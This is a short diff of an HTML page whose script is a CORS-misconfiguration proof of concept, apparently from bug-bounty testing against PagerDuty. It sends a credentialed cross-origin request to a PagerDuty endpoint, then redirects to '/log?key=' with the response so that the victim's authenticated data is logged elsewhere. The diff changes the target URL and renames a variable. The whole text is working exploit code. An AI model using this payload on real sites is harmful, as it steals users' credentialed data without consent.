@@ -3,12 +3,11 @@
 <head>
 <script>
 function cors(){
-   var req = new XMLHttpRequest();
-   req.onload = reqListener;
-   req.open('get','https://hacker07.pagerduty.com/fe-data',true);
-   req.withCredentials = true;
-   req.send();
-
+   var xhr = new XMLHttpRequest();
+   xhr.onload = reqListener;
+   xhr.open('get','https://www.pagerduty.com/cdn-cgi/rum?',true);
+   xhr.withCredentials = true;
+   xhr.send();
    function reqListener() {
        location='/log?key='+this.responseText;
    }
